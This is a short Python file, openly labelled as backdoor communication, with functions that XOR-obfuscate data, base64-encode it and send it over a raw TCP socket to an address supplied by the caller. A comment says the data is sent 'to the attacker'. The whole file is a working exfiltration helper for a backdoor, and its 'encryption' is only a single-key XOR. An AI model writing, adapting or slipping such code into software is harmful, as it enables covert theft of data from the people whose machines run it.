import socket
import base64

def send_data(data, ip, port):
    # Initialize a socket for communication
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        # Attempt to connect to the specified IP and port
        s.connect((ip, port))
        # Send all data to the remote server
        s.sendall(data)
    except socket.error as e:
        # Capture and report socket-related errors
        print(f"Socket error: {e}")
    finally:
        # Ensure the socket is closed whether or not an error occurred
        s.close()

def decode_base64(encoded_string):
    # Decode a base64 encoded string
    decoded_bytes = base64.b64decode(encoded_string)
    return decoded_bytes.decode('utf-8')

def encrypt_data(data, key):
    # Encrypt the data using a simple encryption method
    encrypted_data = ''.join(chr(ord(c) ^ key) for c in data)
    return encrypted_data

# Backdoor communication
def send_encrypted_data(data, key, ip, port):
    # Encrypt the data before sending it to the attacker
    encrypted_data = encrypt_data(data, key)
    # Encode the encrypted data using base64
    encoded_data = base64.b64encode(encrypted_data.encode('utf-8'))
    # Send the encoded data
    send_data(encoded_data, ip, port)